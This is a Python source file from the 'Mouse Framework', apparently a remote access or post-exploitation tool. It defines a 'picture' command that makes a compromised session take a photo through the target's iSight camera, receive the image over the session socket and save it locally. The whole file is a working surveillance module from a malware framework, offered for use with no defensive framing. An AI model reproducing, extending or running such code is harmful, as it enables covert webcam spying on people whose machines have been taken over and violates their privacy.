#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import json, time, binascii, os
import core.helper as h

class command:
    def __init__(self):
        self.name = "picture"
        self.description = "Take picture through iSight."
        self.type = "native"

    def run(self,session,cmd_data):
		h.info_general("Taking picture...")
		response = json.loads(session.send_command(cmd_data))
		try:
			success = response["status"]
			if success == 1:
				size = int(response["size"])
				file_name = "isight_{0}.jpg".format(int(time.time()))
				data = session.sock_receive_data(size)
				h.info_general("Saving {0}".format(file_name))
				# save to file
				f = open(os.path.join('downloads',file_name),'w')
				f.write(data)
				f.close()
				h.info_success("Saved to downloads/{0}!".format(file_name))
		except Exception as e:
			print e

